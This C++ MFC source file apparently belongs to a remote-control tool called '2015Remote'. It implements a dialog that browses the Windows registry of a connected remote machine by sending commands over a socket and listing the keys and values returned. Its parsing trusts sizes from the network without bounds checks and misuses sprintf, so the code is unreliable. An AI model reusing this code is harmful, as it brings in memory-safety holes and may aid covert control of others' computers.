// RegisterDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "2015Remote.h"
#include "RegisterDlg.h"
#include "afxdialogex.h"


enum MYKEY{
	MHKEY_CLASSES_ROOT,
	MHKEY_CURRENT_USER,
	MHKEY_LOCAL_MACHINE,
	MHKEY_USERS,
	MHKEY_CURRENT_CONFIG
};
enum KEYVALUE{
	MREG_SZ,
	MREG_DWORD,
	MREG_BINARY,
	MREG_EXPAND_SZ
};

// CRegisterDlg 对话框

IMPLEMENT_DYNAMIC(CRegisterDlg, CDialog)


CRegisterDlg::CRegisterDlg(CWnd* pParent,IOCPServer* IOCPServer, CONTEXT_OBJECT* ContextObject)
	: CDialog(CRegisterDlg::IDD, pParent)
{
	m_bIsClosed = FALSE;
	m_bIsWorking = FALSE;
	m_iocpServer	= IOCPServer;
	m_ContextObject	= ContextObject;
}

CRegisterDlg::~CRegisterDlg()
{
	printf("~CRegisterDlg \n");
}

void CRegisterDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_TREE, m_Tree);
	DDX_Control(pDX, IDC_LIST, m_ControlList);
}


BEGIN_MESSAGE_MAP(CRegisterDlg, CDialog)
	ON_WM_CLOSE()
	ON_NOTIFY(TVN_SELCHANGED, IDC_TREE, &CRegisterDlg::OnTvnSelchangedTree)
END_MESSAGE_MAP()


// CRegisterDlg 消息处理程序


BOOL CRegisterDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
	CString str;
	sockaddr_in  ClientAddr;
	memset(&ClientAddr, 0, sizeof(ClientAddr));
	int ClientAddrLen = sizeof(ClientAddr);
	BOOL bResult = getpeername(m_ContextObject->sClientSocket, (SOCKADDR*)&ClientAddr, &ClientAddrLen);

	str.Format("%s - 注册表管理", bResult != INVALID_SOCKET ? inet_ntoa(ClientAddr.sin_addr) : "");
	SetWindowText(str);

	m_ImageListTree.Create(18, 18, ILC_COLOR16,10, 0);   //制作 树控件上的图标

	m_hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_ICON_FATHER), IMAGE_ICON, 18, 18, 0);
	m_ImageListTree.Add(m_hIcon);
	m_hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_ICON_DIR), IMAGE_ICON, 18, 18, 0);
	m_ImageListTree.Add(m_hIcon);

	m_Tree.SetImageList(&m_ImageListTree,TVSIL_NORMAL);

	m_hRoot = m_Tree.InsertItem("注册表管理",0,0,0,0);      //0
	HKCU    = m_Tree.InsertItem("HKEY_CURRENT_USER",1,1,m_hRoot,0); //1
	HKLM    = m_Tree.InsertItem("HKEY_LOCAL_MACHINE",1,1,m_hRoot,0);  
	HKUS    = m_Tree.InsertItem("HKEY_USERS",1,1,m_hRoot,0);
	HKCC    = m_Tree.InsertItem("HKEY_CURRENT_CONFIG",1,1,m_hRoot,0);
	HKCR    = m_Tree.InsertItem("HKEY_CLASSES_ROOT",1,1,m_hRoot,0);

	m_Tree.Expand(m_hRoot,TVE_EXPAND);

	m_ControlList.InsertColumn(0,"名称",LVCFMT_LEFT,150,-1);   
	m_ControlList.InsertColumn(1,"类型",LVCFMT_LEFT,60,-1);
	m_ControlList.InsertColumn(2,"数据",LVCFMT_LEFT,300,-1);
	m_ControlList.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	//////添加图标//////
	m_ImageListControlList.Create(16,16,TRUE,2,2);
	m_ImageListControlList.Add(AfxGetApp()->LoadIcon(IDI_ICON_STRING));
	m_ImageListControlList.Add(AfxGetApp()->LoadIcon(IDI_ICON_DWORD));
	m_ControlList.SetImageList(&m_ImageListControlList,LVSIL_SMALL);

	m_isEnable = TRUE;   //该值是为了解决频繁 向被控端请求   

	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

void CRegisterDlg::OnClose()
{
#if CLOSE_DELETE_DLG
	m_ContextObject->v1 = 0;
#endif
	CancelIo((HANDLE)m_ContextObject->sClientSocket);
	closesocket(m_ContextObject->sClientSocket);
	CDialog::OnClose();
	m_bIsClosed = TRUE;
#if CLOSE_DELETE_DLG
	//delete this;//此处同文件管理对话框处理
#endif
}


void CRegisterDlg::OnTvnSelchangedTree(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMTREEVIEW pNMTreeView = reinterpret_cast<LPNMTREEVIEW>(pNMHDR);

	if(!m_isEnable)	
	{
		return;
	}
	m_isEnable=FALSE;;

	TVITEM Item = pNMTreeView->itemNew;

	if(Item.hItem == m_hRoot)
	{
		m_isEnable=TRUE;;
		return;
	}

	m_hSelectedItem=Item.hItem;			//保存用户打开的子树节点句柄   //0  1 2 2 3
	m_ControlList.DeleteAllItems();

	CString strFullPath=GetFullPath(m_hSelectedItem);    //获得键值路径  

	char bToken=GetFatherPath(strFullPath);       //[2] \1\2\3
	//愈加一个键
	int nitem=m_ControlList.InsertItem(0,"(默认)",0);
	m_ControlList.SetItemText(nitem,1,"REG_SZ");	
	m_ControlList.SetItemText(nitem,2,"(数据未设置值)");

	strFullPath.Insert(0,bToken);//插入  那个根键
	bToken=COMMAND_REG_FIND;
	strFullPath.Insert(0,bToken);      //插入查询命令  [COMMAND_REG_FIND][x]

	m_iocpServer->OnClientPreSending(m_ContextObject, (LPBYTE)(strFullPath.GetBuffer(0)), strFullPath.GetLength()+1);

	m_isEnable = TRUE;

	*pResult = 0;
}

CString CRegisterDlg::GetFullPath(HTREEITEM hCurrent)
{
	CString strTemp;
	CString strReturn = "";
	while(1)
	{
		if(hCurrent==m_hRoot)
		{
			return strReturn;
		}
		strTemp = m_Tree.GetItemText(hCurrent);  
		if(strTemp.Right(1) != "\\")
			strTemp += "\\";
		strReturn = strTemp  + strReturn;
		hCurrent = m_Tree.GetParentItem(hCurrent);   //得到父的
	}
	return strReturn;
}

char CRegisterDlg::GetFatherPath(CString& strFullPath)
{
	char bToken;
	if(!strFullPath.Find("HKEY_CLASSES_ROOT"))	//判断主键
	{
		bToken=MHKEY_CLASSES_ROOT;
		strFullPath.Delete(0,sizeof("HKEY_CLASSES_ROOT"));
	}else if(!strFullPath.Find("HKEY_CURRENT_USER"))
	{
		bToken=MHKEY_CURRENT_USER;
		strFullPath.Delete(0,sizeof("HKEY_CURRENT_USER"));

	}else if(!strFullPath.Find("HKEY_LOCAL_MACHINE"))
	{
		bToken=MHKEY_LOCAL_MACHINE;
		strFullPath.Delete(0,sizeof("HKEY_LOCAL_MACHINE"));

	}else if(!strFullPath.Find("HKEY_USERS"))
	{
		bToken=MHKEY_USERS;
		strFullPath.Delete(0,sizeof("HKEY_USERS"));

	}else if(!strFullPath.Find("HKEY_CURRENT_CONFIG"))
	{
		bToken=MHKEY_CURRENT_CONFIG;
		strFullPath.Delete(0,sizeof("HKEY_CURRENT_CONFIG"));

	}
	return bToken;
}


void CRegisterDlg::OnReceiveComplete(void)
{
	m_bIsWorking = TRUE;
	switch (m_ContextObject->InDeCompressedBuffer.GetBuffer(0)[0])
	{
	case TOKEN_REG_PATH:
		{
			AddPath((char*)(m_ContextObject->InDeCompressedBuffer.GetBuffer(1)));
			break;
		}
	case TOKEN_REG_KEY:
		{
			AddKey((char*)(m_ContextObject->InDeCompressedBuffer.GetBuffer(1)));
			break;
		}
	default:
		// 传输发生异常数据
		break;
	}
	m_bIsWorking = FALSE;
}


struct REGMSG{
	int count;         //名字个数
	DWORD size;             //名字大小
	DWORD valsize;     //值大小
};


void CRegisterDlg::AddPath(char* szBuffer)
{
	if(szBuffer==NULL) return;
	int msgsize=sizeof(REGMSG);
	REGMSG msg;
	memcpy((void*)&msg,szBuffer,msgsize);
	DWORD size =msg.size;
	int count=msg.count;
	if(size>0&&count>0){                   //一点保护措施
		for(int i=0;i<count;++i){
			if (m_bIsClosed)
				break;
			char* szKeyName=szBuffer+size*i+msgsize;
			m_Tree.InsertItem(szKeyName,1,1,m_hSelectedItem,0);//插入子键名称
			m_Tree.Expand(m_hSelectedItem,TVE_EXPAND);
		}
	}
}

void CRegisterDlg::AddKey(char* szBuffer)
{
	m_ControlList.DeleteAllItems();
	int iItem=m_ControlList.InsertItem(0,"(Data)",0);
	m_ControlList.SetItemText(iItem,1,"REG_SZ");	
	m_ControlList.SetItemText(iItem,2,"(NULL)");

	if(szBuffer==NULL) return;
	REGMSG msg;
	memcpy((void*)&msg,szBuffer,sizeof(msg));
	char* szTemp=szBuffer+sizeof(msg);
	for(int i=0;i<msg.count;++i)
	{
		if (m_bIsClosed)
			break;
		BYTE Type=szTemp[0];   //类型
		szTemp+=sizeof(BYTE);
		char* szValueName=szTemp;   //取出名字
		szTemp+=msg.size;
		BYTE* szValueDate=(BYTE*)szTemp;      //取出值
		szTemp+=msg.valsize;
		if(Type==MREG_SZ)
		{
			int iItem=m_ControlList.InsertItem(0,szValueName,0);
			m_ControlList.SetItemText(iItem,1,"REG_SZ");	
			m_ControlList.SetItemText(iItem,2,(char*)szValueDate);
		}
		if(Type==MREG_DWORD)
		{
			char ValueDate[256];
			DWORD d=(DWORD)szValueDate;
			memcpy((void*)&d,szValueDate,sizeof(DWORD));
			CString strValue;
			strValue.Format("0x%x",d);
			sprintf(ValueDate,"  (%wd)",d);
			strValue+=" ";
			strValue+=ValueDate;
			int iItem=m_ControlList.InsertItem(0,szValueName,1);
			m_ControlList.SetItemText(iItem,1,"REG_DWORD");	
			m_ControlList.SetItemText(iItem,2,strValue);
		}
		if(Type==MREG_BINARY)
		{
			char ValueDate[256];
			sprintf(ValueDate,"%wd",szValueDate);

			int iItem=m_ControlList.InsertItem(0,szValueName,1);
			m_ControlList.SetItemText(iItem,1,"REG_BINARY");	
			m_ControlList.SetItemText(iItem,2,ValueDate);
		}
		if(Type==MREG_EXPAND_SZ)
		{
			int iItem=m_ControlList.InsertItem(0,szValueName,0);
			m_ControlList.SetItemText(iItem,1,"REG_EXPAND_SZ");	
			m_ControlList.SetItemText(iItem,2,(char*)szValueDate);
		}
	}
}
